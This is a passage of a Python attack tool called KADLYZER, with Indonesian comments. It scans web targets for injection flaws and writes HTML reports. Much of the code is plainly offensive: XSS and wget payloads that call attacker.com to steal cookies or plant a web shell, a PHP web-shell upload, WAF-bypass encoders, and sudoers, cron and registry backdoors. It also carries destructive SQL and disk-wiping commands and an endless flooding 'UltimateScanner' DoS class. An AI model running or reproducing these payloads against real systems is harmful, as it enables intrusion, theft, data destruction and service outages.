    logger.info(f"Starting vulnerability scan on {url}...")
    
    vulnerabilities = {}
    
    # Use WAF bypass headers if available
    headers = waf_bypass_headers or random.choice(BYPASS_WAF_HEADERS)
    
    # Collect input points
    input_points = discover_parameters(url, headers)
    
    for vuln_type, payloads in PAYLOADS.items():
        vulnerabilities[vuln_type] = []
        
        for input_point in input_points:
            for payload in payloads:
                try:
                    test_url = f"{url}?{input_point}={payload}" if "?" not in url else f"{url}&{input_point}={payload}"
                    response = requests.get(test_url, headers=headers, timeout=10)
                    
                    # Validate vulnerability with enhanced checks
                    validation_result = validate_vulnerability(vuln_type, response, payload, test_url)
                    
                    if validation_result["confirmed"]:
                        vuln_detail = {
                            "parameter": input_point,
                            "payload": payload,
                            "url": test_url,
                            "confidence": validation_result["confidence"],
                            "evidence": validation_result["evidence"]
                        }
                        vulnerabilities[vuln_type].append(vuln_detail)
                        logger.warning(
                            f"Confirmed {vuln_type} vulnerability found:\n" +
                            f"  Parameter: {input_point}\n" +
                            f"  Confidence: {validation_result['confidence']}%\n" +
                            f"  Evidence: {', '.join(validation_result['evidence'])}"
                        )
                        break
                        
                except Exception as e:
                    logger.debug(f"Error testing {vuln_type} on {input_point}: {str(e)}")
                    continue
    
    return vulnerabilities

def discover_parameters(url, headers):
    """Discover potential input parameters"""
    try:
        response = requests.get(url, headers=headers, timeout=10)
        html = response.text
        
        # Common parameter names to check
        common_params = ["id", "page", "file", "query", "search", "q", "s", "url", "p", "action", "dir", "path"]
        
        # Extract parameters from URL if they exist
        parsed = urlparse(url)
        existing_params = []
        if parsed.query:
            existing_params = [param.split('=')[0] for param in parsed.query.split('&')]
        
        # Extract potential parameters from HTML forms
        form_params = []
        input_pattern = re.compile(r'<input.*?name=["\']([^"\']+)["\']', re.IGNORECASE)
        form_params = input_pattern.findall(html)
        
        # Combine all discovered parameters
        all_params = list(set(existing_params + form_params + common_params))
        
        return all_params
    except Exception as e:
        logger.error(f"Parameter discovery failed: {str(e)}")
        return ["id", "page", "file", "search"]  # Return default parameters

def scan_forms(url, headers):
    """Scan HTML forms for vulnerabilities"""
    form_vulnerabilities = {vuln_type: [] for vuln_type in PAYLOADS.keys()}
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        html = response.text
        
        # Simple form extraction
        form_pattern = re.compile(r'<form.*?action=["\']([^"\']*)["\'].*?>(.*?)</form>', re.DOTALL | re.IGNORECASE)
        input_pattern = re.compile(r'<input.*?name=["\']([^"\']+)["\']', re.IGNORECASE)
        
        forms = form_pattern.findall(html)
        
        for form_action, form_content in forms:
            # Determine form action URL
            if not form_action:
                form_action = url
            elif not form_action.startswith(('http://', 'https://')):
                form_action = urljoin(url, form_action)
            
            # Extract input fields
            input_fields = input_pattern.findall(form_content)
            
            # Test each form field with specific payloads
            for field in input_fields:
                # Only test common vulnerable fields (skip CSRF tokens, etc.)
                if any(vuln_field in field.lower() for vuln_field in ["user", "pass", "login", "search", "query", "id", "name", "email"]):
                    for vuln_type, payloads in PAYLOADS.items():
                        # Only try first two payloads for forms to reduce noise
                        for payload in payloads[:2]:
                            data = {input_field: "" for input_field in input_fields}
                            data[field] = payload
                            
                            try:
                                form_response = requests.post(form_action, headers=headers, data=data, timeout=10, allow_redirects=True)
                                
                                if validate_vulnerability(vuln_type, form_response, payload, form_action):
                                    vuln_detail = {
                                        "parameter": field,
                                        "payload": payload,
                                        "url": form_action,
                                        "method": "POST",
                                        "confidence": 100,
                                        "evidence": []
                                    }
                                    form_vulnerabilities[vuln_type].append(vuln_detail)
                                    logger.warning(f"Confirmed {vuln_type} vulnerability found in form field '{field}' with payload: {payload}")
                                    break
                            except Exception as e:
                                logger.debug(f"Error testing form field {field}: {str(e)}")
    except Exception as e:
        logger.error(f"Form scanning failed: {str(e)}")
    
    return form_vulnerabilities

def exploit_suggestion(vulnerabilities, target_info):
    """Provide targeted exploit suggestions based on discovered vulnerabilities"""
    logger.info("Generating exploit suggestions...")
    
    suggestions = []
    
    # Total count of vulnerabilities
    vuln_count = sum(len(vulns) for vuln_type, vulns in vulnerabilities.items())
    
    if vuln_count == 0:
        suggestions.append({
            "type": "general",
            "title": "No obvious vulnerabilities detected",
            "description": "Consider deeper manual testing or using specialized tools",
            "tools": ["Burp Suite Pro", "OWASP ZAP", "Metasploit"]
        })
    else:
        # Generate specific suggestions for each vulnerability type
        for vuln_type, vulns in vulnerabilities.items():
            if not vulns:
                continue
                
            if vuln_type == "sql_injection":
                suggestions.append({
                    "type": "sql_injection",
                    "title": f"SQL Injection ({len(vulns)} potential points)",
                    "description": "Database access and manipulation possible",
                    "commands": [
                        f"sqlmap -u \"{target_info['full_url']}?{vulns[0]['parameter']}=1\" --dbs --batch",
                        f"sqlmap -u \"{target_info['full_url']}?{vulns[0]['parameter']}=1\" --dbs --batch --technique=U",
                        f"sqlmap -u \"{target_info['full_url']}\" --forms --batch"
                    ],
                    "affected_params": [v['parameter'] for v in vulns]
                })
            
            elif vuln_type == "xss":
                suggestions.append({
                    "type": "xss",
                    "title": f"Cross-Site Scripting ({len(vulns)} potential points)",
                    "description": "Client-side code execution possible",
                    "payloads": [
                        "<img src=x onerror=alert(document.cookie)>",
                        "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
                        "<svg onload=\"eval(atob('base64-encoded-js-payload'))\">",
                    ],
                    "affected_params": [v['parameter'] for v in vulns]
                })
            
            elif vuln_type == "path_traversal":
                suggestions.append({
                    "type": "path_traversal",
                    "title": f"Path Traversal ({len(vulns)} potential points)",
                    "description": "File system access possible",
                    "paths_to_try": [
                        "/etc/passwd",
                        "/etc/shadow",
                        "/var/www/html/config.php",
                        "C:\\Windows\\win.ini",
                        "../../../wp-config.php"
                    ],
                    "affected_params": [v['parameter'] for v in vulns]
                })
            
            elif vuln_type == "command_injection":
                suggestions.append({
                    "type": "command_injection",
                    "title": f"Command Injection ({len(vulns)} potential points)",
                    "description": "Server command execution possible",
                    "commands": [
                        ";id",
                        "| cat /etc/passwd",
                        "& whoami",
                        "; ping -c 1 attacker.com",
                        "; wget http://attacker.com/shell.php -O /var/www/html/shell.php"
                    ],
                    "affected_params": [v['parameter'] for v in vulns]
                })
            
            elif vuln_type == "ssrf":
                suggestions.append({
                    "type": "ssrf",
                    "title": f"Server-Side Request Forgery ({len(vulns)} potential points)",
                    "description": "Internal network access possible",
                    "targets": [
                        "http://localhost:8080/admin",
                        "http://127.0.0.1/phpinfo.php",
                        "http://169.254.169.254/latest/meta-data/",
                        "file:///etc/passwd",
                        "http://internal-service:8080/"
                    ],
                    "affected_params": [v['parameter'] for v in vulns]
                })
    
    return suggestions

def generate_report(target_info, results):
    """Generate a comprehensive report of all findings"""
    logger.info("Generating final report...")
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report_dir = "reports"
    if not os.path.exists(report_dir):
        os.makedirs(report_dir)
    
    # Create report filename
    domain = target_info['domain']
    report_filename = os.path.join(report_dir, f"kadlyzer_report_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
    
    # Prepare JSON report
    report = {
        "scan_info": {
            "target": target_info['full_url'],
            "domain": domain,
            "timestamp": timestamp,
            "kadlyzer_version": "8.0"
        },
        "summary": {
            "reconnaissance": {
                "ip_addresses": results.get("recon", {}).get("ip_addresses", []),
                "dns_records_count": len(results.get("recon", {}).get("dns_records", {}))
            },
            "ports": {
                "open_ports_count": len(results.get("ports", {})),
                "critical_services": [f"{port} ({info['service']})" for port, info in results.get("ports", {}).items() 
                                     if info['service'] in ["SSH", "FTP", "MySQL", "PostgreSQL", "Redis", "MongoDB", "MSSQL"]]
            },
            "waf": {
                "detected": results.get("waf", {}).get("waf_detected", False),
                "type": results.get("waf", {}).get("waf_type", None),
                "bypassed": results.get("waf", {}).get("bypass_successful", False)
            },
            "directories": {
                "sensitive_dirs_count": len(results.get("directories", {})),
                "critical_findings": [url for dir_name, dir_info in results.get("directories", {}).items() 
                                     if dir_info['status_code'] in [200, 301, 302] and 
                                     any(critical in dir_name.lower() for critical in ["admin", "config", "backup", ".git", ".env"])]
            },
            "vulnerabilities": {
                "total_count": sum(len(vulns) for vulns in results.get("vulnerabilities", {}).values()),
                "types_found": [vuln_type for vuln_type, vulns in results.get("vulnerabilities", {}).items() if vulns]
            }
        },
        "details": results,
        "risk_score": calculate_risk_score(results),
        "recommendations": generate_recommendations(results)
    }
    
    # Write JSON report
    with open(f"{report_filename}.json", "w") as f:
        json.dump(report, f, indent=4)
    
    # Generate HTML report for better visualization
    html_report = generate_html_report(report)
    with open(f"{report_filename}.html", "w") as f:
        f.write(html_report)
    
    logger.info(f"Report saved to {report_filename}.json and {report_filename}.html")
    
    return {
        "json_path": f"{report_filename}.json",
        "html_path": f"{report_filename}.html",
        "summary": report["summary"],
        "risk_score": report["risk_score"]
    }

def calculate_risk_score(results):
    """Calculate overall risk score based on findings"""
    score = 0
    max_score = 100
    
    # Scoring factors
    waf_present = results.get("waf", {}).get("waf_detected", False)
    open_ports = results.get("ports", {})
    sensitive_dirs = results.get("directories", {})
    vulnerabilities = results.get("vulnerabilities", {})
    
    # Base score of 20 for all targets
    score = 20
    
    # Add points for security measures
    if waf_present:
        score -= 10  # WAF presence reduces risk
        if not results.get("waf", {}).get("bypass_successful", False):
            score -= 5  # Non-bypassable WAF reduces risk further
    
    # Add points for open ports
    for port, info in open_ports.items():
        if port in [22, 3389]:  # SSH, RDP
            score += 5
        elif port in [21, 23, 3306, 1433, 5432, 6379, 27017]:  # FTP, Telnet, Databases
            score += 8
        else:
            score += 2
    
    # Cap port risk at 25
    port_score = score - 20
    if port_score > 25:
        score = 20 + 25
    
    # Add points for sensitive directories
    for dir_name, dir_info in sensitive_dirs.items():
        if "admin" in dir_name.lower() or "login" in dir_name.lower():
            score += 5
        elif "backup" in dir_name.lower() or "config" in dir_name.lower():
            score += 8
        elif ".git" in dir_name.lower() or ".env" in dir_name.lower():
            score += 10
        else:
            score += 3
    
    # Cap directory risk at 20
    dir_score = score - (20 + min(port_score, 25))
    if dir_score > 20:
        score = 20 + min(port_score, 25) + 20
    
    # Add points for vulnerabilities
    vuln_weights = {
        "sql_injection": 10,
        "command_injection": 10,
        "path_traversal": 8,
        "xss": 6,
        "ssrf": 8
    }
    
    for vuln_type, vulns in vulnerabilities.items():
        if vuln_type in vuln_weights and vulns:
            # Add points for each vulnerability, but with diminishing returns
            score += vuln_weights[vuln_type] * min(len(vulns), 3)
    
    # Ensure score stays within bounds
    score = min(max(score, 0), max_score)
    
    # Risk categorization
    risk_level = "Low"
    if score >= 75:
        risk_level = "Critical"
    elif score >= 50:
        risk_level = "High"
    elif score >= 25:
        risk_level = "Medium"
    
    return {
        "score": score,
        "max_score": max_score,
        "level": risk_level,
        "factors": {
            "waf_present": waf_present,
            "open_ports_count": len(open_ports),
            "sensitive_dirs_count": len(sensitive_dirs),
            "vulnerabilities_count": sum(len(vulns) for vulns in vulnerabilities.values())
        }
    }

def generate_recommendations(results):
    """Generate security recommendations based on findings"""
    recommendations = []
    
    # WAF recommendations
    waf_data = results.get("waf", {})
    if not waf_data.get("waf_detected", False):
        recommendations.append({
            "category": "WAF",
            "title": "Implement Web Application Firewall",
            "description": "No WAF detected. Consider implementing a WAF solution like Cloudflare, AWS WAF, or ModSecurity.",
            "priority": "High"
        })
    elif waf_data.get("bypass_successful", False):
        recommendations.append({
            "category": "WAF",
            "title": "Improve WAF Configuration",
            "description": f"Current WAF ({waf_data.get('waf_type', 'Unknown')}) configuration can be bypassed. Review and strengthen rules.",
            "priority": "High"
        })
    
    # Port security recommendations
    open_ports = results.get("ports", {})
    critical_ports = [port for port, info in open_ports.items() if port in [21, 23, 3306, 1433, 5432, 6379, 27017]]
    
    if critical_ports:
        recommendations.append({
            "category": "Network",
            "title": "Secure Exposed Services",
            "description": f"Critical services exposed: {', '.join([str(p) for p in critical_ports])}. Consider restricting access with firewall rules.",
            "priority": "High"
        })
    
    # Directory security
    sensitive_dirs = results.get("directories", {})
    admin_panels = [info['url'] for dir_name, info in sensitive_dirs.items() 
                   if any(sensitive in dir_name.lower() for sensitive in ["admin", "login", "dashboard"])]
    
    if admin_panels:
        recommendations.append({
            "category": "Access Control",
            "title": "Secure Administrative Interfaces",
            "description": "Administrative interfaces are publicly accessible. Consider IP restrictions, VPN access, or strong authentication.",
            "priority": "High"
        })
    
    # Vulnerability-specific recommendations
    vulnerabilities = results.get("vulnerabilities", {})
    
    if vulnerabilities.get("sql_injection", []):
        recommendations.append({
            "category": "Development",
            "title": "Fix SQL Injection Vulnerabilities",
            "description": "Implement parameterized queries and input validation for all database operations.",
            "priority": "Critical"
        })
    
    if vulnerabilities.get("xss", []):
        recommendations.append({
            "category": "Development",
            "title": "Fix Cross-Site Scripting Vulnerabilities",
            "description": "Implement output encoding and Content Security Policy (CSP) to prevent XSS attacks.",
            "priority": "High"
        })
    
    if vulnerabilities.get("path_traversal", []):
        recommendations.append({
            "category": "Development",
            "title": "Fix Path Traversal Vulnerabilities",
            "description": "Validate file paths and use safe APIs for file operations. Consider a whitelist approach for file access.",
            "priority": "Critical"
        })
    
    if vulnerabilities.get("command_injection", []):
        recommendations.append({
            "category": "Development",
            "title": "Fix Command Injection Vulnerabilities",
            "description": "Avoid using shell commands with user input. If necessary, implement strict input validation and command whitelisting.",
            "priority": "Critical"
        })
    
    # General recommendations
    recommendations.append({
        "category": "General",
        "title": "Implement Regular Security Testing",
        "description": "Schedule regular security assessments, vulnerability scanning, and penetration testing.",
        "priority": "Medium"
    })
    
    return recommendations

def generate_html_report(report_data):
    """Generate HTML report from the JSON data"""
    
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KADLYZER Security Report - {report_data['scan_info']['domain']}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }}
        header {{
            background-color: #2c3e50;
            color: white;
            padding: 20px;
            text-align: center;
        }}
        h1, h2, h3 {{
            margin-top: 0;
        }}
        .summary-box {{
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            padding: 20px;
            margin-bottom: 20px;
        }}
        .risk-score {{
            text-align: center;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
            color: white;
            font-weight: bold;
        }}
        .risk-low {{
            background-color: #27ae60;
        }}
        .risk-medium {{
            background-color: #f39c12;
        }}
        .risk-high {{
            background-color: #e74c3c;
        }}
        .risk-critical {{
            background-color: #c0392b;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }}
        th, td {{
            text-align: left;
            padding: 12px;
            border-bottom: 1px solid #ddd;
        }}
        th {{
            background-color: #f2f2f2;
        }}
        tr:hover {{
            background-color: #f5f5f5;
        }}
        .priority-high {{
            color: #e74c3c;
            font-weight: bold;
        }}
        .priority-medium {{
            color: #f39c12;
            font-weight: bold;
        }}
        .priority-low {{
            color: #27ae60;
            font-weight: bold;
        }}
        .footer {{
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            color: #7f8c8d;
            font-size: 14px;
        }}
    </style>
</head>
<body>
    <header>
        <h1>KADLYZER Security Report</h1>
        <p>Target: {report_data['scan_info']['domain']} | Date: {report_data['scan_info']['timestamp']}</p>
    </header>
    
    <div class="container">
        <div class="risk-score risk-{report_data['risk_score']['level'].lower()}">
            <h2>Overall Risk: {report_data['risk_score']['level']}</h2>
            <p>Score: {report_data['risk_score']['score']}/{report_data['risk_score']['max_score']}</p>
        </div>
        
        <div class="summary-box">
            <h2>Executive Summary</h2>
            <p>
                This report presents the findings of a security assessment performed on {report_data['scan_info']['domain']}.
                The assessment identified a risk score of {report_data['risk_score']['score']}/{report_data['risk_score']['max_score']}, 
                which is categorized as {report_data['risk_score']['level']} risk.
            </p>
            
            <h3>Key Findings:</h3>
            <ul>
                <li>Web Application Firewall (WAF): {'Detected' if report_data['summary']['waf']['detected'] else 'Not Detected'}</li>
                <li>Open Ports: {report_data['summary']['ports']['open_ports_count']} ports discovered</li>
                <li>Sensitive Directories: {report_data['summary']['directories']['sensitive_dirs_count']} found</li>
                <li>Vulnerabilities: {report_data['summary']['vulnerabilities']['total_count']} potential issues discovered</li>
            </ul>
        </div>
        
        <div class="summary-box">
            <h2>Recommendations</h2>
            <table>
                <tr>
                    <th>Category</th>
                    <th>Recommendation</th>
                    <th>Priority</th>
                </tr>
    """
    
    # Add recommendations to table
    for rec in report_data.get('recommendations', []):
        priority_class = f"priority-{rec['priority'].lower()}"
        html += f"""
                <tr>
                    <td>{rec['category']}</td>
                    <td>
                        <strong>{rec['title']}</strong><br>
                        {rec['description']}
                    </td>
                    <td class="{priority_class}">{rec['priority']}</td>
                </tr>
        """
    
    html += """
            </table>
        </div>
        
        <div class="summary-box">
            <h2>Detailed Findings</h2>
    """
    
    # Add vulnerabilities section if found
    vulnerabilities = report_data['details'].get('vulnerabilities', {})
    if any(vulnerabilities.values()):
        html += """
            <h3>Vulnerabilities</h3>
            <table>
                <tr>
                    <th>Type</th>
                    <th>Parameter</th>
                    <th>Details</th>
                </tr>
        """
        
        for vuln_type, vulns in vulnerabilities.items():
            if not vulns:
                continue
                
            for i, vuln in enumerate(vulns):
                # Only show first 5 of each type to keep report manageable
                if i >= 5:
                    break
                    
                html += f"""
                <tr>
                    <td>{vuln_type.replace('_', ' ').title()}</td>
                    <td>{vuln['parameter']}</td>
                    <td>
                        Payload: <code>{vuln['payload']}</code><br>
                        URL: {vuln.get('url', 'N/A')}
                    </td>
                </tr>
                """
        
        html += """
            </table>
        """
    
    # Add open ports section if found
    ports = report_data['details'].get('ports', {})
    if ports:
        html += """
            <h3>Open Ports</h3>
            <table>
                <tr>
                    <th>Port</th>
                    <th>Service</th>
                    <th>Banner</th>
                </tr>
        """
        
        for port, info in sorted(ports.items()):
            html += f"""
            <tr>
                <td>{port}</td>
                <td>{info['service']}</td>
                <td>{info.get('banner', 'N/A')}</td>
            </tr>
            """
        
        html += """
            </table>
        """
    
    # Add sensitive directories section if found
    directories = report_data['details'].get('directories', {})
    if directories:
        html += """
            <h3>Sensitive Directories</h3>
            <table>
                <tr>
                    <th>URL</th>
                    <th>Status</th>
                    <th>Details</th>
                </tr>
        """
        
        for dir_name, dir_info in directories.items():
            html += f"""
            <tr>
                <td>{dir_info['url']}</td>
                <td>{dir_info['status_code']} {dir_info['status']}</td>
                <td>Size: {dir_info['content_length']} bytes</td>
            </tr>
            """
        
        html += """
            </table>
        """
    
    html += """
        </div>
        
        <div class="footer">
            <p>This report was generated by KADLYZER v8.0. For authorized security testing only.</p>
            <p>The information in this report should be used responsibly and ethically.</p>
        </div>
    </div>
</body>
</html>
    """
    
    return html

def advanced_waf_bypass(target_info):
    """Implementasi teknik bypass WAF yang lebih advanced"""
    logger.info("Attempting advanced WAF bypass techniques...")
    
    bypass_results = {
        "success": False,
        "technique": None,
        "payload": None,
        "headers": None
    }

    url = target_info['full_url']
    
    # Test setiap kombinasi header dan teknik
    for headers in ADVANCED_WAF_BYPASS["headers"]:
        for technique in ADVANCED_WAF_BYPASS["techniques"]:
            try:
                # Terapkan teknik encoding sesuai dengan metode bypass
                if technique == "double_encode":
                    encoded_url = double_url_encode(url)
                elif technique == "unicode_bypass":
                    encoded_url = unicode_encode_url(url)
                elif technique == "case_switching":
                    encoded_url = case_switch_url(url)
                elif technique == "null_byte":
                    encoded_url = add_null_byte(url)
                elif technique == "path_bypass":
                    encoded_url = path_bypass_url(url)
                elif technique == "hex_encode":
                    encoded_url = hex_encode_url(url)
                elif technique == "comment_inject":
                    encoded_url = comment_inject_url(url)
                elif technique == "whitespace_manipulation":
                    encoded_url = whitespace_manipulate(url)
                elif technique == "charset_bypass":
                    encoded_url = charset_bypass_url(url)
                elif technique == "protocol_pollution":
                    encoded_url = protocol_pollution_url(url)
                else:
                    encoded_url = url

                response = requests.get(
                    encoded_url,
                    headers=headers,
                    timeout=10,
                    verify=False,
                    allow_redirects=True
                )

                if response.status_code == 200:
                    # Verifikasi bypass dengan test payload
                    test_payload = random.choice(BYPASS_PAYLOADS["sql_injection"])
                    test_url = f"{encoded_url}?id={test_payload}"
                    
                    test_response = requests.get(
                        test_url,
                        headers=headers,
                        timeout=10,
                        verify=False
                    )

                    if test_response.status_code == 200:
                        bypass_results["success"] = True
                        bypass_results["technique"] = technique
                        bypass_results["payload"] = test_payload
                        bypass_results["headers"] = headers
                        logger.info(f"WAF bypass successful using {technique}")
                        return bypass_results

            except Exception as e:
                logger.debug(f"Bypass attempt failed: {str(e)}")
                continue

    return bypass_results

def double_url_encode(url):
    """Double URL encode untuk bypass WAF"""
    encoded = urllib.parse.quote(url)
    return urllib.parse.quote(encoded)

def unicode_encode_url(url):
    """Unicode encode untuk bypass WAF"""
    return ''.join([f'\\u{ord(c):04x}' for c in url])

def case_switch_url(url):
    """Case switching untuk bypass WAF"""
    return ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(url))

def add_null_byte(url):
    """Tambahkan null byte untuk bypass WAF"""
    return url + '%00'

def path_bypass_url(url):
    """Path traversal untuk bypass WAF"""
    parsed = urllib.parse.urlparse(url)
    path = parsed.path
    if path:
        path = '/.' + path
    new_url = parsed._replace(path=path)
    return urllib.parse.urlunparse(new_url)

def hex_encode_url(url):
    """Hex encode untuk bypass WAF"""
    return ''.join([f'%{ord(c):02x}' for c in url])

def comment_inject_url(url):
    """Inject SQL comment untuk bypass WAF"""
    parts = url.split('/')
    return '/'.join(p + '/**/' for p in parts[:-1]) + parts[-1]

def whitespace_manipulate(url):
    """Manipulasi whitespace untuk bypass WAF"""
    return url.replace(' ', '%09').replace('/', '%0d/')

def charset_bypass_url(url):
    """Charset bypass untuk bypass WAF"""
    return ''.join([f'%{ord(c):02x}' for c in url])

def protocol_pollution_url(url):
    """Protocol pollution untuk bypass WAF"""
    return url.replace('http://', 'https://')

def aggressive_scan(target_info):
    """Melakukan scanning yang lebih agresif"""
    logger.info("Memulai aggressive scanning...")
    
    results = {
        "dos_vulnerable": False,
        "upload_vulnerable": False,
        "rce_vulnerable": False,
        "details": {}
    }
    
    # Test DoS vulnerability
    try:
        start_time = time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(requests.get, target_info['full_url']) for _ in range(100)]
            concurrent.futures.wait(futures, timeout=10)
        response_time = time.time() - start_time
        
        if response_time > 5:
            results["dos_vulnerable"] = True
            results["details"]["dos"] = f"Target vulnerable to DoS (Response time: {response_time:.2f}s)"
    except Exception as e:
        logger.debug(f"DoS test failed: {str(e)}")

    # Test File Upload vulnerability
    try:
        files = {
            'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')
        }
        response = requests.post(f"{target_info['full_url']}/upload", files=files)
        if response.status_code != 404 and 'success' in response.text.lower():
            results["upload_vulnerable"] = True
            results["details"]["upload"] = "Target potentially vulnerable to unrestricted file upload"
    except Exception as e:
        logger.debug(f"Upload test failed: {str(e)}")

    return results

# Tambahkan payload untuk serangan yang sangat ekstrem
ULTIMATE_PAYLOADS = {
    "kernel_exploits": [
        # Linux Kernel Exploits
        "echo 'kernel.core_pattern=|/bin/sh -c \"echo PID %p > /tmp/log\"' > /etc/sysctl.conf",
        "echo '* * * * * root chmod 4755 /bin/bash' > /etc/cron.d/root",
        "echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
        
        # Windows Kernel Exploits
        "wmic process call create 'cmd.exe /c powershell.exe -enc BASE64_ENCODED_PAYLOAD'",
        "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d C:\\backdoor.exe /f",
    ],
    
    "memory_corruption": [
        # Buffer Overflow Payloads
        "A" * 65535,  # Basic buffer overflow
        "${jndi:ldap://attacker.com/a}",  # Log4Shell
        "%" * 10000 + "s" * 10000,  # Format string attack
        "\x00" * 65535,  # Null byte injection
    ],
    
    "database_destruction": [
        # Destructive SQL Queries
        "'; DROP DATABASE production; --",
        "'; TRUNCATE TABLE users; --",
        "'; DELETE FROM users; INSERT INTO users (username,password) VALUES ('attacker','pwned'); --",
        f"'; CREATE FUNCTION sys_exec(@cmd VARCHAR(4000)) RETURNS INT AS BEGIN DECLARE @ret INT, @tmp TABLE (output VARCHAR(8000)); INSERT INTO @tmp EXEC @ret = xp_cmdshell @cmd; RETURN @ret; END; SELECT sys_exec('powershell -enc {base64.b64encode('whoami'.encode()).decode()}'); --",
    ],
    
    "network_flood": [
        # Network Flooding Payloads
        "$(ping -n 65535 127.0.0.1)",
        "$(seq 65535 | xargs -I{} nc -zv localhost {})",
        "$(for i in {1..65535}; do curl localhost:$i; done)",
    ],
    
    "filesystem_chaos": [
        # Filesystem Attack Payloads
        "rm -rf /*",  # Extreme caution!
        "mkfs.ext4 /dev/sda",  # Format disk
        ":(){:|:&};:",  # Fork bomb
        "dd if=/dev/zero of=/dev/sda bs=4M",  # Disk wipe
    ]
}

class UltimateScanner:
    def __init__(self, target_info, threads=1000):
        self.target_info = target_info
        self.threads = threads
        self.session = requests.Session()
        self.success_count = 0
        
    async def launch_ultimate_attack(self):
        """Jalankan semua serangan ekstrem secara bersamaan"""
        logger.warning("Launching ultimate attack - USE WITH EXTREME CAUTION!")
        
        async with aiohttp.ClientSession() as session:
            tasks = []
            
            # Jalankan semua serangan secara paralel
            tasks.extend([
                self.execute_memory_attacks(),
                self.execute_network_flood(),
                self.execute_database_attacks(),
                self.execute_filesystem_attacks(),
                self.execute_kernel_attacks()
            ])
            
            # Tambahkan serangan DoS yang ekstrem
            tasks.extend([self.execute_dos_attack() for _ in range(10)])
            
            return await asyncio.gather(*tasks)
    
    async def execute_memory_attacks(self):
        """Serangan yang menarget memory"""
        for payload in ULTIMATE_PAYLOADS["memory_corruption"]:
            try:
                # Kirim payload dalam chunks besar
                chunk_size = 1024 * 1024  # 1MB chunks
                for i in range(0, len(payload), chunk_size):
                    chunk = payload[i:i+chunk_size]
                    await self.send_payload(chunk, method='POST')
                    await self.send_payload(chunk, method='GET')
                    await self.send_payload(chunk, method='PUT')
            except Exception as e:
                logger.debug(f"Memory attack failed: {str(e)}")
    
    async def execute_network_flood(self):
        """Flood network dengan request"""
        connections = []
        try:
            # Buat ribuan koneksi simultan
            for _ in range(5000):  # SANGAT agresif
                try:
                    conn = await self.create_slow_connection()
                    connections.append(conn)
                    # Kirim data terus menerus
                    await conn.write(b"X" * 1024 * 1024)
                except:
                    continue
                    
            # Tahan koneksi
            await asyncio.sleep(30)
        finally:
            for conn in connections:
                try:
                    await conn.close()
                except:
                    pass
    
    async def execute_database_attacks(self):
        """Serangan database yang sangat agresif"""
        for payload in ULTIMATE_PAYLOADS["database_destruction"]:
            try:
                # Kirim ke berbagai endpoint potensial
                endpoints = [
                    '/api/query', '/admin/query', '/db/exec',
                    '/api/v1/query', '/api/v2/query', '/graphql'
                ]
                
                for endpoint in endpoints:
                    url = f"{self.target_info['full_url']}{endpoint}"
                    
                    # Kirim dengan berbagai metode
                    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
                    for method in methods:
                        try:
                            headers = self.get_ultimate_headers()
                            data = {
                                'query': payload,
                                'exec': payload,
                                'sql': payload,
                                'input': payload
                            }
                            
                            async with self.session.request(
                                method, 
                                url,
                                json=data,
                                headers=headers,
                                timeout=5
                            ) as response:
                                if response.status != 404:
                                    self.log_success('database', url, payload)
                        except:
                            continue
            except Exception as e:
                logger.debug(f"Database attack failed: {str(e)}")
    
    async def execute_filesystem_attacks(self):
        """Serangan filesystem yang ekstrem"""
        for payload in ULTIMATE_PAYLOADS["filesystem_chaos"]:
            try:
                # Encode payload dalam berbagai format
                encoded_payloads = [
                    base64.b64encode(payload.encode()).decode(),
                    urllib.parse.quote_plus(payload),
                    ''.join([hex(ord(c))[2:] for c in payload]),
                    payload.encode('utf-16le').decode('utf-8', errors='ignore')
                ]
                
                for encoded in encoded_payloads:
                    await self.send_payload(encoded, method='POST')
            except Exception as e:
                logger.debug(f"Filesystem attack failed: {str(e)}")
    
    async def execute_kernel_attacks(self):
        """Serangan yang menarget kernel"""
        for payload in ULTIMATE_PAYLOADS["kernel_exploits"]:
            try:
                # Kirim dengan berbagai protokol
                protocols = ['http', 'https', 'ftp', 'gopher', 'file']
                for protocol in protocols:
                    url = f"{protocol}://{self.target_info['domain']}"
                    await self.send_payload(payload, url=url)
            except Exception as e:
                logger.debug(f"Kernel attack failed: {str(e)}")
    
    async def execute_dos_attack(self):
        """DoS attack yang sangat ekstrem"""
        try:
            # Buat pool connection yang sangat besar
            conn_pool = [self.create_slow_connection() for _ in range(2000)]
            
            # Kirim request dalam jumlah besar
            while True:
                tasks = []
                for _ in range(5000):
                    tasks.append(self.send_heavy_payload())
                await asyncio.gather(*tasks)
                
        except Exception as e:
            logger.debug(f"DoS attack failed: {str(e)}")
    
    async def send_heavy_payload(self):
        """Kirim payload yang berat"""
        try:
            # Generate payload besar
            payload = "A" * (1024 * 1024 * 10)  # 10MB payload
            headers = self.get_ultimate_headers()
            
            async with self.session.post(
                self.target_info['full_url'],
                data=payload,
                headers=headers,
                timeout=1
            ) as response:
                await response.read()
        except:
            pass
    
    def get_ultimate_headers(self):
        """Generate headers untuk bypass semua security"""
        headers = {
            'User-Agent': f"Mozilla/5.0 ({random.choice(['Windows', 'Linux', 'Mac'])}) AppleWebKit/537.36",
            'X-Forwarded-For': f"127.0.0.1, {'.'.join([str(random.randint(1,255)) for _ in range(4)])}",
